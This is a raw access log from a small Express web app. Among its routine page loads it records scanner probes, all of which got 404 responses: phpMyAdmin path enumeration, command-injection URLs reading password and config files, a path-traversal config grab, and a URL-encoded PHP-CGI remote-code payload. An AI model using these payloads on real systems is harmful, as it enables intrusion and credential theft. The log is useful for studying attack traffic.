[90mGET //cpphpmyadmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //forum/phpmyadmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET /images/wiz-icon.png [32m200 [90m2ms - 5.6kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /manager/html [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /foltia/ [33m404 [90m1ms[0m
[90mGET /epgrec/do-record.sh [33m404 [90m0ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m9ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mHEAD / [32m200 [90m7ms - 9.75kb[0m
[90mGET /intl/zh-CN/ [33m404 [90m2ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /vicidial/project_auth_entries.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mHEAD / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m9ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET /robots.txt [33m404 [90m1ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m10ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /proxy.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET /robots.txt [33m404 [90m2ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m4ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET /cgi-bin/rtpd.cgi?echo&AdminPasswd_ss|tdb&get&HTTPAccount [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /scripts/setup.php [33m404 [90m1ms[0m
[90mGET //pMA/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpAdmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //phpmyadmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //myadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //mysqladmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //MyAdmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //PHPMYADMIN/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //PMA/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //SQL/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //db/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //pHpMyAdMiN/scripts/setup.php [33m404 [90m2ms[0m
[90mGET //pma/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //sql/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //mysql/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //mysqladmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //MySQLAdmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //web/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //websql/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //phpMyAdmin-2/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //apache-default/phpmyadmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //blog/phpmyadmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //cpanelphpmyadmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //cpphpmyadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //forum/phpmyadmin/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //admin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //admin/pma/scripts/setup.php [33m404 [90m0ms[0m
[90mGET //admin/phpmyadmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //db/scripts/setup.php [33m404 [90m1ms[0m
[90mGET //dbadmin/scripts/setup.php [33m404 [90m1ms[0m
[90mGET /cgi-bin/rtpd.cgi?echo&AdminPasswd_ss|tdb&get&HTTPAccount [33m404 [90m1ms[0m
[90mGET /cgi/maker/ptcmd.cgi?cmd=;cat+/tmp/config/usr.ini [33m404 [90m0ms[0m
[90mGET /oidtable.cgi?grep='$IFS/etc/privpasswd;' [33m404 [90m1ms[0m
[90mGET /LIVE_VIEW.asp [33m404 [90m1ms[0m
[90mGET /oamp/System.xml?action=login&user=L1_admin&password=L1_51 [33m404 [90m0ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET /event [32m200 [90m7ms - 9.75kb[0m
[90mGET /register [32m200 [90m3ms - 3.01kb[0m
[90mGET /sponsor [32m200 [90m2ms - 3.17kb[0m
[90mGET /speaker [32m200 [90m3ms - 2.79kb[0m
[90mGET /agenda [32m200 [90m9ms - 13.97kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET /stylesheets/stylemain.css [32m200 [90m2ms - 9.02kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /vicidial/project_auth_entries.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /manager/html [33m404 [90m2ms[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /admin.cgi/.css [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m9ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /foltia/ [33m404 [90m1ms[0m
[90mGET /epgrec/do-record.sh [33m404 [90m1ms[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mOPTIONS /ipc$ [33m404 [90m1ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /stylesheets/stylemain.css [32m200 [90m2ms - 9.02kb[0m
[90mGET /images/bg_body.png [32m200 [90m1ms - 174b[0m
[90mGET /images/carbon.png [32m200 [90m4ms - 214.07kb[0m
[90mGET /images/img_corner.png [32m200 [90m1ms - 342b[0m
[90mGET /images/img06.jpg [32m200 [90m1ms - 583b[0m
[90mGET /images/img06_hover.jpg [32m200 [90m2ms - 568b[0m
[90mGET /images/wiz-icon.png [32m200 [90m1ms - 5.6kb[0m
[90mGET /images/img06_hover.jpg [36m304 [90m1ms[0m
[90mGET /agenda [32m200 [90m10ms - 13.97kb[0m
[90mGET /stylesheets/stylemain.css [36m304 [90m1ms[0m
[90mGET /images/panel.png [32m200 [90m4ms - 73.9kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET /robots.txt [33m404 [90m1ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET /stylesheets/stylemain.css [32m200 [90m3ms - 9.02kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m5ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m1ms[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET /manager/html [33m404 [90m2ms[0m
[90mHEAD / [32m200 [90m5ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /etc/lib/pChart2/examples/index.php?Action=View&Script=/../etc/zpanel/panel/cnf/db.php [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mPOST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404 [90m2ms[0m
[90mPOST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404 [90m1ms[0m
[90mPOST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404 [90m0ms[0m
[90mPOST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404 [90m1ms[0m
[90mPOST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E [33m404 [90m1ms[0m
[90mHEAD / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m6ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET /robots.txt [33m404 [90m2ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET /robots.txt [33m404 [90m1ms[0m
Error: ENOENT, open '/opt/wiz-business-co2/node_modules/express/node_modules/connect/node_modules/static-favicon/../public/favicon.ico'
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m7ms - 9.75kb[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
[90mOPTIONS /ipc$ [33m404 [90m1ms[0m
[90mOPTIONS /ipc$ [33m404 [90m0ms[0m
[90mOPTIONS /ipc$ [33m404 [90m1ms[0m
[90mGET / [32m200 [90m8ms - 9.75kb[0m
